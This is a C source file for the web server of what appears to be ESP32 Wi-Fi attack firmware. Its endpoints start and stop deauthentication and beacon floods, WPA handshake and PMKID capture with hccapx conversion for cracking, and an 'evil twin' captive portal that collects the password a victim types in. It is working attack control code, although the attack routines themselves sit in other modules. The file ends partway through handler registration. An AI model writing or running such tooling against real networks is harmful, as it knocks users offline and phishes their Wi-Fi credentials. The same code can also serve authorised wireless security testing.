#include <string.h>
#include <ctype.h>
#include <sys/stat.h>
#include "esp_http_server.h"
#include "esp_log.h"
#include "cJSON.h"
#include "nvs_flash.h"
#include "web_server.h"
#include "wifi_manager.h"
#include "attack_manager.h"
#include "filesystem_manager.h"
#include "packet_handler.h"
#include "evil_twin_manager.h"
#include "time.h"

#include <sys/time.h>

static const char *TAG = "WEB_SERVER";
static httpd_handle_t server = NULL;

#define MAX_WS_CLIENTS 5
static int g_ws_clients[MAX_WS_CLIENTS] = {-1, -1, -1, -1, -1};

static void add_ws_client(int fd) {
    for(int i=0; i<MAX_WS_CLIENTS; i++) {
        if(g_ws_clients[i] == -1) {
            g_ws_clients[i] = fd;
            return;
        }
    }
}

static void remove_ws_client(int fd) {
    for(int i=0; i<MAX_WS_CLIENTS; i++) {
        if(g_ws_clients[i] == fd) {
            g_ws_clients[i] = -1;
            return;
        }
    }
}

static void broadcast_worker(void *arg) {
    char *msg = (char *)arg;
    httpd_ws_frame_t ws_pkt;
    memset(&ws_pkt, 0, sizeof(httpd_ws_frame_t));
    ws_pkt.payload = (uint8_t*)msg;
    ws_pkt.len = strlen(msg);
    ws_pkt.type = HTTPD_WS_TYPE_TEXT;

    for (int i=0; i<MAX_WS_CLIENTS; i++) {
        if (g_ws_clients[i] != -1) {
            httpd_ws_send_frame_async(server, g_ws_clients[i], &ws_pkt);
        }
    }
    free(msg);
}

void web_server_broadcast_msg(const char *msg) {
    if (!server || !msg) return;
    char *copy = strdup(msg);
    if (!copy) return;
    if (httpd_queue_work(server, broadcast_worker, copy) != ESP_OK) {
        free(copy);
    }
}

static esp_err_t ws_handler(httpd_req_t *req) {
    if (req->method == HTTP_GET) {
        ESP_LOGI(TAG, "Handshake done, the new connection was opened");
        int fd = httpd_req_to_sockfd(req);
        add_ws_client(fd);
        return ESP_OK;
    }

    httpd_ws_frame_t ws_pkt;
    uint8_t *buf = NULL;
    memset(&ws_pkt, 0, sizeof(httpd_ws_frame_t));
    ws_pkt.type = HTTPD_WS_TYPE_TEXT;

    esp_err_t ret = httpd_ws_recv_frame(req, &ws_pkt, 0);
    if (ret != ESP_OK) return ret;

    if (ws_pkt.len) {
        buf = calloc(1, ws_pkt.len + 1);
        if (buf == NULL) return ESP_ERR_NO_MEM;
        ws_pkt.payload = buf;
        ret = httpd_ws_recv_frame(req, &ws_pkt, ws_pkt.len);
        if (ret != ESP_OK) {
            free(buf);
            return ret;
        }
        ESP_LOGI(TAG, "WS Msg: %s", ws_pkt.payload);

        free(buf);
    }

    if (ws_pkt.type == HTTPD_WS_TYPE_CLOSE) {
         ESP_LOGI(TAG, "WS Close");
         int fd = httpd_req_to_sockfd(req);
         remove_ws_client(fd);
         return ESP_OK;
    }
    return ESP_OK;
}

static void url_decode(char *dst, const char *src) {
    char a, b;
    while (*src) {
        if ((*src == '%') &&
            ((a = src[1]) && (b = src[2])) &&
            (isxdigit(a) && isxdigit(b))) {
            if (a >= 'a') a -= 'a'-'A';
            if (a >= 'A') a -= ('A' - 10);
            else a -= '0';
            if (b >= 'a') b -= 'a'-'A';
            if (b >= 'A') b -= ('A' - 10);
            else b -= '0';
            *dst++ = 16*a + b;
            src+=3;
        } else if (*src == '+') {
            *dst++ = ' ';
            src++;
        } else {
            *dst++ = *src++;
        }
    }
    *dst++ = '\0';
}

extern const uint8_t index_html_start[] asm("_binary_index_html_start");
extern const uint8_t index_html_end[]   asm("_binary_index_html_end");
extern const uint8_t style_css_start[] asm("_binary_style_css_start");
extern const uint8_t style_css_end[]   asm("_binary_style_css_end");
extern const uint8_t script_js_start[] asm("_binary_script_js_start");
extern const uint8_t script_js_end[]   asm("_binary_script_js_end");
extern const uint8_t captive_portal_html_start[] asm("_binary_captive_portal_html_start");
extern const uint8_t captive_portal_html_end[]   asm("_binary_captive_portal_html_end");

static esp_err_t set_time_handler(httpd_req_t *req) {
    char content[64];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received <= 0) return ESP_FAIL;
    content[received] = '\0';

    cJSON *json = cJSON_Parse(content);
    esp_err_t ret = ESP_FAIL;

    if (json) {
        cJSON *ts_item = cJSON_GetObjectItem(json, "timestamp");
        if (cJSON_IsNumber(ts_item)) {
            struct timeval tv;
            tv.tv_sec = (time_t)ts_item->valueint;
            tv.tv_usec = 0;

            settimeofday(&tv, NULL);

            time_t now;
            time(&now);
            struct tm timeinfo;
            localtime_r(&now, &timeinfo);
            char time_str[64];
            strftime(time_str, sizeof(time_str), "%c", &timeinfo);
            ESP_LOGI(TAG, "Time updated from browser: %s", time_str);

            ret = ESP_OK;
        }
        cJSON_Delete(json);
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t root_handler(httpd_req_t *req) {
    if (evil_twin_manager_is_running()) {
        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, (const char*)captive_portal_html_start, captive_portal_html_end - captive_portal_html_start);
    } else {
        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, (const char*)index_html_start, index_html_end - index_html_start);
    }
    return ESP_OK;
}

static esp_err_t admin_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, (const char*)index_html_start, index_html_end - index_html_start);
    return ESP_OK;
}

static esp_err_t css_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/css");
    httpd_resp_send(req, (const char*)style_css_start, style_css_end - style_css_start);
    return ESP_OK;
}

static esp_err_t js_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "application/javascript");
    httpd_resp_send(req, (const char*)script_js_start, script_js_end - script_js_start);
    return ESP_OK;
}

static esp_err_t get_password_handler(httpd_req_t *req) {
    char buf[128];
    int ret, remaining = req->content_len;
    if (remaining > sizeof(buf) - 1) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Content too long");
        return ESP_FAIL;
    }
    ret = httpd_req_recv(req, buf, remaining);
    if (ret <= 0) { return ESP_FAIL;
    }
    buf[ret] = '\0';

    char encoded_password[65], decoded_password[65];
    if (httpd_query_key_value(buf, "password", encoded_password, sizeof(encoded_password)) == ESP_OK) {
        url_decode(decoded_password, encoded_password);
        evil_twin_manager_handle_password_submission(decoded_password);
        httpd_resp_send(req, "Attempting to connect...", HTTPD_RESP_USE_STRLEN);
    } else {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Password field missing");
    }
    return ESP_OK;
}

static esp_err_t favicon_handler(httpd_req_t *req) {
    httpd_resp_set_status(req, "204 No Content");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t captive_portal_handler(httpd_req_t *req) {
    if (evil_twin_manager_is_running()) {
        ESP_LOGI(TAG, "Captive portal redirect for URI: %s", req->uri);
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "/");
        httpd_resp_send(req, NULL, 0);
    } else {
        httpd_resp_set_status(req, "404 Not Found");
        httpd_resp_send(req, "Not found", HTTPD_RESP_USE_STRLEN);
    }
    return ESP_OK;
}

static esp_err_t get_evil_twin_status_handler(httpd_req_t *req) {
    evil_twin_verify_state_t status = evil_twin_manager_get_verification_status();
    const char *status_str = "idle";
    switch (status) {
        case VERIFY_STATE_IN_PROGRESS: status_str = "in_progress"; break;
        case VERIFY_STATE_SUCCESS: status_str = "success"; break;
        case VERIFY_STATE_FAIL: status_str = "fail"; break;
        default: status_str = "idle"; break;
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "status", status_str);
    const char *json_string = cJSON_PrintUnformatted(root);

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_string);
    cJSON_Delete(root);
    free((void*)json_string);
    return ESP_OK;
}

static esp_err_t ap_info_handler(httpd_req_t *req) {
    char mac_str[18];
    uint8_t mac[6];
    uint8_t channel;
    wifi_second_chan_t second;

    esp_wifi_get_mac(WIFI_IF_AP, mac);
    esp_wifi_get_channel(&channel, &second);
    snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "ssid", SOFTAP_SSID);
    cJSON_AddStringToObject(root, "mac", mac_str);
    cJSON_AddNumberToObject(root, "channel", channel);

    const char *json_string = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_string);

    cJSON_Delete(root);
    free((void*)json_string);
    return ESP_OK;
}

static esp_err_t scan_handler(httpd_req_t *req) {
    wifi_scan_data_t scan_data;
    esp_err_t ret = wifi_manager_scan_networks(&scan_data);
    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, "success", ret == ESP_OK);
    if (ret == ESP_OK) {
        cJSON *networks = cJSON_AddArrayToObject(root, "networks");
        for (int i = 0; i < scan_data.count; i++) {
            cJSON *net = cJSON_CreateObject();
            cJSON_AddStringToObject(net, "ssid", (char*)scan_data.results[i].ssid);
            cJSON_AddStringToObject(net, "bssid", scan_data.results[i].bssid);
            cJSON_AddNumberToObject(net, "rssi", scan_data.results[i].rssi);
            cJSON_AddNumberToObject(net, "channel", scan_data.results[i].channel);
            cJSON_AddNumberToObject(net, "auth", scan_data.results[i].authmode);
            cJSON_AddItemToArray(networks, net);
        }
    }
    const char *json_string = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_string);

    cJSON_Delete(root);
    free((void*)json_string);
    return ESP_OK;
}

static esp_err_t set_target_handler(httpd_req_t *req) {
    char content[128];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received <= 0) return ESP_FAIL;
    content[received] = '\0';
    cJSON *json = cJSON_Parse(content);
    esp_err_t ret = ESP_FAIL;
    if (json) {
        cJSON *ssid_item = cJSON_GetObjectItem(json, "ssid");
        cJSON *bssid_item = cJSON_GetObjectItem(json, "bssid");
        if (cJSON_IsString(ssid_item) && cJSON_IsString(bssid_item)) {
            ret = wifi_manager_set_target(ssid_item->valuestring, bssid_item->valuestring);
        }
        cJSON_Delete(json);
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t list_files_handler(httpd_req_t *req) {
    file_list_t file_list;
    esp_err_t ret = filesystem_manager_list_files(&file_list);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, "success", ret == ESP_OK);
    if (ret == ESP_OK) {
        cJSON *files = cJSON_AddArrayToObject(root, "files");
        for (int i = 0; i < file_list.count; i++) {
            cJSON *file_item = cJSON_CreateObject();
            cJSON_AddStringToObject(file_item, "filename", file_list.files[i].filename);
            cJSON_AddNumberToObject(file_item, "size", file_list.files[i].size);
            cJSON_AddItemToArray(files, file_item);
        }
    }

    const char *json_string = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_string);

    cJSON_Delete(root);
    free((void*)json_string);
    return ESP_OK;
}

static esp_err_t download_file_handler(httpd_req_t *req) {
    size_t query_len = httpd_req_get_url_query_len(req) + 1;
    if (query_len <= 1) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Filename is required in query");
        return ESP_FAIL;
    }
    char *query_buf = malloc(query_len);
    if (!query_buf) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Memory allocation failed");
        return ESP_FAIL;
    }
    if (httpd_req_get_url_query_str(req, query_buf, query_len) != ESP_OK) {
        free(query_buf);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Failed to get query string");
        return ESP_FAIL;
    }
    char filename[MAX_FILENAME_LEN];
    if (httpd_query_key_value(query_buf, "file", filename, sizeof(filename)) != ESP_OK) {
        free(query_buf);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Parameter 'file' not found");
        return ESP_FAIL;
    }
    free(query_buf);

    FILE *file = filesystem_manager_open_file_read(filename);
    if (!file) {
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "File not found on filesystem");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/octet-stream");
    char content_disposition[100];
    snprintf(content_disposition, sizeof(content_disposition), "attachment; filename=\"%s\"", filename);
    httpd_resp_set_hdr(req, "Content-Disposition", content_disposition);

    char buffer[1024];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (httpd_resp_send_chunk(req, buffer, bytes_read) != ESP_OK) {
            fclose(file);
            ESP_LOGE(TAG, "File sending failed!");
            return ESP_FAIL;
        }
    }

    httpd_resp_send_chunk(req, NULL, 0);
    fclose(file);
    ESP_LOGI(TAG, "File %s sent successfully", filename);
    return ESP_OK;
}

static esp_err_t handle_delete_file(httpd_req_t *req) {
    char content[128];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received <= 0) return ESP_FAIL;
    content[received] = '\0';
    cJSON *json = cJSON_Parse(content);
    esp_err_t ret = ESP_FAIL;
    if (json) {
        cJSON *name_item = cJSON_GetObjectItem(json, "name");
        if (cJSON_IsString(name_item)) {
            ret = filesystem_manager_delete_file(name_item->valuestring);
        }
        cJSON_Delete(json);
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t convert_hccapx_handler(httpd_req_t *req) {
    char content[128];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received <= 0) return ESP_FAIL;
    content[received] = '\0';
    cJSON *json = cJSON_Parse(content);
    char out_name[128] = {0};
    esp_err_t ret = ESP_FAIL;
    if (json) {
        cJSON *name_item = cJSON_GetObjectItem(json, "name");
        if (cJSON_IsString(name_item)) {
            ret = filesystem_convert_to_hccapx(name_item->valuestring, out_name);
        }
        cJSON_Delete(json);
    }

    httpd_resp_set_type(req, "application/json");
    if (ret == ESP_OK) {
        char resp[256];
        snprintf(resp, sizeof(resp), "{\"success\":true, \"new_file\":\"%s\"}", out_name);
        httpd_resp_sendstr(req, resp);
    } else {
        httpd_resp_sendstr(req, "{\"success\":false, \"message\":\"Conversion failed or no handshake found\"}");
    }
    return ESP_OK;
}

static void set_channel_transition_task(void *pvParameters) {
    int channel = (int)pvParameters;
    ESP_LOGI(TAG, "Stopping Web Server for Channel Change...");
    web_server_stop();
    vTaskDelay(pdMS_TO_TICKS(500));

    wifi_manager_change_channel(channel);

    vTaskDelay(pdMS_TO_TICKS(2000));
    ESP_LOGI(TAG, "Restarting Web Server...");
    web_server_start();
    vTaskDelete(NULL);
}

static esp_err_t handle_set_channel(httpd_req_t *req) {
    char content[32];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received <= 0) return ESP_FAIL;
    content[received] = '\0';
    cJSON *json = cJSON_Parse(content);
    int channel = 0;
    if (json) {
        cJSON *channel_item = cJSON_GetObjectItem(json, "channel");
        if (cJSON_IsNumber(channel_item)) {
            channel = channel_item->valueint;
        }
        cJSON_Delete(json);
    }

    if (channel > 0) {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"success\":true}");
        vTaskDelay(pdMS_TO_TICKS(100));
        xTaskCreate(set_channel_transition_task, "ch_transit_task", 4096, (void*)channel, 5, NULL);
    } else {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"success\":false}");
    }
    return ESP_OK;
}

static void reboot_task(void *pvParameters) {
    vTaskDelay(pdMS_TO_TICKS(2000));
    esp_restart();
    vTaskDelete(NULL);
}

static esp_err_t reset_handler(httpd_req_t *req) {
    ESP_LOGW(TAG, "Performing FACTORY RESET (Clear NVS + Format LittleFS)...");

    filesystem_manager_format();
    esp_wifi_restore(); // Clear WiFi credentials
    nvs_flash_erase();  // Clear NVS
    nvs_flash_init();

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"success\":true}");

    xTaskCreate(reboot_task, "reboot_task", 2048, NULL, 5, NULL);
    return ESP_OK;
}

static esp_err_t start_auto_hunt_handler(httpd_req_t *req) {
    char content[128];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received <= 0) return ESP_FAIL;
    content[received] = '\0';
    cJSON *json = cJSON_Parse(content);

    int pmkid_time = 5;
    int handshake_time = 10;

    if (json) {
        cJSON *j_pmkid = cJSON_GetObjectItem(json, "pmkid_time");
        cJSON *j_handshake = cJSON_GetObjectItem(json, "handshake_time");
        if (cJSON_IsNumber(j_pmkid)) pmkid_time = j_pmkid->valueint;
        if (cJSON_IsNumber(j_handshake)) handshake_time = j_handshake->valueint;
        cJSON_Delete(json);
    }

    esp_err_t ret = attack_manager_start_auto_hunt(pmkid_time, handshake_time);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static void evil_twin_transition_task(void *pvParameters) {
    ESP_LOGI(TAG, "Stopping Web Server for WiFi transition...");
    web_server_stop();

    vTaskDelay(pdMS_TO_TICKS(500));

    ESP_LOGI(TAG, "Starting Evil Twin...");
    esp_err_t ret = evil_twin_manager_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start Evil Twin Manager: %s", esp_err_to_name(ret));
    }

    vTaskDelay(pdMS_TO_TICKS(2000));

    ESP_LOGI(TAG, "Restarting Web Server...");
    web_server_start();

    vTaskDelete(NULL);
}

static void stop_evil_twin_transition_task(void *pvParameters) {
    ESP_LOGI(TAG, "Stopping Web Server to terminate Evil Twin...");
    web_server_stop();

    vTaskDelay(pdMS_TO_TICKS(500));

    evil_twin_manager_stop();

    // Wait for the evil_twin_task in evil_twin_manager.c to finish and restore AP
    vTaskDelay(pdMS_TO_TICKS(3000));

    ESP_LOGI(TAG, "Restarting Web Server on Management AP...");
    web_server_start();
    vTaskDelete(NULL);
}

static esp_err_t start_evil_twin_handler(httpd_req_t *req) {
    if (evil_twin_manager_is_running()) {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"success\":false, \"message\":\"Already running\"}");
        return ESP_OK;
    }

    if (!wifi_manager_has_target()) {
         httpd_resp_set_type(req, "application/json");
         httpd_resp_sendstr(req, "{\"success\":false, \"message\":\"No target set\"}");
         return ESP_OK;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"success\":true}");

    vTaskDelay(pdMS_TO_TICKS(100));

    xTaskCreate(evil_twin_transition_task, "et_transit_task", 4096, NULL, 5, NULL);
    return ESP_OK;
}

static esp_err_t stop_evil_twin_handler(httpd_req_t *req) {
    if (!evil_twin_manager_is_running()) {
        httpd_resp_sendstr(req, "{\"success\":false, \"message\":\"Not running\"}");
        return ESP_OK;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"success\":true}");

    vTaskDelay(pdMS_TO_TICKS(100));
    xTaskCreate(stop_evil_twin_transition_task, "stop_et_task", 4096, NULL, 5, NULL);
    return ESP_OK;
}

static esp_err_t start_deauth_handler(httpd_req_t *req) {

    char content[64];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received > 0) content[received] = '\0';

    esp_err_t ret = attack_manager_start_continuous_deauth();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t stop_deauth_handler(httpd_req_t *req) {
    esp_err_t ret = attack_manager_stop_continuous_deauth();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t api_beacon_start(httpd_req_t *req) {
    char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';
    cJSON *root = cJSON_Parse(buf);

    char ssid_prefix[33] = "ESP32_Beacon";
    int amount = 20;
    int mode = 0;

    if (root) {
        cJSON *j_ssid = cJSON_GetObjectItem(root, "ssid");
        cJSON *j_amt = cJSON_GetObjectItem(root, "amount");
        cJSON *j_mode = cJSON_GetObjectItem(root, "mode");
        if (j_ssid && cJSON_IsString(j_ssid)) strncpy(ssid_prefix, j_ssid->valuestring, 32);
        if (j_amt && cJSON_IsNumber(j_amt)) amount = j_amt->valueint;
        if (j_mode && cJSON_IsNumber(j_mode)) mode = j_mode->valueint;

        cJSON_Delete(root);
    }

    beacon_flood_mode_t bf_mode = BEACON_MODE_CUSTOM;
    if (mode == 1) bf_mode = BEACON_MODE_CLONE;
    if (mode == 2) bf_mode = BEACON_MODE_DATABASE;

    esp_err_t res = attack_manager_start_beacon_flood(bf_mode, ssid_prefix, amount);

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (res == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t api_beacon_stop(httpd_req_t *req) {
    esp_err_t ret = attack_manager_stop_beacon_flood();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t start_capture_handler(httpd_req_t *req) {
    char content[128];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received > 0) content[received] = '\0';

    esp_err_t ret = attack_manager_start_capture();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t stop_capture_handler(httpd_req_t *req) {
    esp_err_t ret = attack_manager_stop_capture();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t start_pmkid_handler(httpd_req_t *req) {
    esp_err_t ret = attack_manager_start_pmkid_capture();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t stop_pmkid_handler(httpd_req_t *req) {
    esp_err_t ret = attack_manager_stop_pmkid_capture();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t scan_clients_start_handler(httpd_req_t *req) {
    esp_err_t ret = attack_manager_start_client_scan();
    httpd_resp_set_type(req, "application/json");
    if (ret == ESP_OK) {
        httpd_resp_sendstr(req, "{\"success\":true, \"message\":\"Scan started\"}");
    } else {
        httpd_resp_sendstr(req, "{\"success\":false, \"message\":\"Failed to start scan\"}");
    }
    return ESP_OK;
}

static esp_err_t scan_clients_results_handler(httpd_req_t *req) {
    client_list_t client_list;
    esp_err_t ret = attack_manager_get_client_scan_results(&client_list);
    cJSON *root = cJSON_CreateObject();
    if (ret != ESP_OK) {
        cJSON_AddBoolToObject(root, "success", false);
    } else {
        cJSON_AddBoolToObject(root, "success", true);
        cJSON *clients = cJSON_AddArrayToObject(root, "clients");
        for (int i = 0; i < client_list.count; i++) {
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                     client_list.clients[i].mac[0], client_list.clients[i].mac[1],
                     client_list.clients[i].mac[2], client_list.clients[i].mac[3],
                     client_list.clients[i].mac[4], client_list.clients[i].mac[5]);
            cJSON_AddItemToArray(clients, cJSON_CreateString(mac_str));
        }
    }

    const char *json_string = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_string);
    cJSON_Delete(root);
    free((void*)json_string);
    return ESP_OK;
}

static esp_err_t status_handler(httpd_req_t *req) {
    cJSON *root = cJSON_CreateObject();
    attack_state_t state = attack_manager_get_state();

    const char *wifi_state_str[] = {
        "IDLE",
        "DEAUTH_CONTINUOUS",
        "CAPTURE_CREDENTIALS",
        "EVIL_TWIN",
        "BEACON_FLOOD",
        "CLIENT_SCAN",
        "PMKID_CAPTURE",
        "AUTO_HUNT"
    };
    cJSON_AddStringToObject(root, "state", wifi_state_str[state]);

    char ssid[33], bssid[18];
    uint8_t channel;
    if (wifi_manager_get_target(ssid, bssid) == ESP_OK) {
        cJSON_AddBoolToObject(root, "has_target", true);
        cJSON_AddStringToObject(root, "target_ssid", (char*)ssid);
        cJSON_AddStringToObject(root, "target_bssid", bssid);
        if(wifi_manager_get_target_channel(&channel) == ESP_OK) {
            cJSON_AddNumberToObject(root, "target_channel", channel);
        }
    } else {
        cJSON_AddBoolToObject(root, "has_target", false);
    }

    const char *json_string = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_string);

    cJSON_Delete(root);
    free((void*)json_string);
    return ESP_OK;
}

static esp_err_t router_connect_handler(httpd_req_t *req) {
    char content[128];
    int received = httpd_req_recv(req, content, sizeof(content) - 1);
    if (received <= 0) return ESP_FAIL;
    content[received] = '\0';
    cJSON *json = cJSON_Parse(content);
    esp_err_t ret = ESP_FAIL;
    if (json) {
        cJSON *ssid_item = cJSON_GetObjectItem(json, "ssid");
        cJSON *pass_item = cJSON_GetObjectItem(json, "password");
        if (cJSON_IsString(ssid_item) && cJSON_IsString(pass_item)) {
            ret = wifi_manager_connect_repeater(ssid_item->valuestring, pass_item->valuestring);
        }
        cJSON_Delete(json);
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t router_disconnect_handler(httpd_req_t *req) {
    esp_err_t ret = wifi_manager_disconnect_repeater();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, (ret == ESP_OK) ? "{\"success\":true}" : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t router_status_handler(httpd_req_t *req) {
    char *status = wifi_manager_get_repeater_status();
    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "status", status);

    const char *json_string = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json_string);
    cJSON_Delete(root);
    free((void*)json_string);
    return ESP_OK;
}

void web_server_start(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 48;
    config.stack_size = 10240;
    config.uri_match_fn = httpd_uri_match_wildcard;
    if (httpd_start(&server, &config) == ESP_OK) {

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/", .method = HTTP_GET, .handler = root_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/admin", .method = HTTP_GET, .handler = admin_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/favicon.ico", .method = HTTP_GET, .handler = favicon_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/style.css", .method = HTTP_GET, .handler = css_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/script.js", .method = HTTP_GET, .handler = js_handler});

        httpd_register_uri_handler(server, &(httpd_uri_t){
            .uri = "/ws",
            .method = HTTP_GET,
            .handler = ws_handler,
            .user_ctx = NULL,
            .is_websocket = true
        });

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/ap-info", .method = HTTP_GET, .handler = ap_info_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/status", .method = HTTP_GET, .handler = status_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/scan", .method = HTTP_GET, .handler = scan_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/target", .method = HTTP_POST, .handler = set_target_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/wifi/set-channel", .method = HTTP_POST, .handler = handle_set_channel});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/scan-clients/start", .method = HTTP_GET, .handler = scan_clients_start_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/scan-clients/results", .method = HTTP_GET, .handler = scan_clients_results_handler});

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/files", .method = HTTP_GET, .handler = list_files_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/download", .method = HTTP_GET, .handler = download_file_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/delete", .method = HTTP_POST, .handler = handle_delete_file});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/reset", .method = HTTP_POST, .handler = reset_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/convert", .method = HTTP_POST, .handler = convert_hccapx_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/set-time", .method = HTTP_POST, .handler = set_time_handler});

        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/deauth/start", .method = HTTP_POST, .handler = start_deauth_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/deauth/stop", .method = HTTP_POST, .handler = stop_deauth_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/capture/start", .method = HTTP_POST, .handler = start_capture_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/capture/stop", .method = HTTP_POST, .handler = stop_capture_handler});
        httpd_register_uri_handler(server, &(httpd_uri_t){.uri = "/api/pmkid/start", .method = HTTP_POST, .handler = start_pmkid_handler});
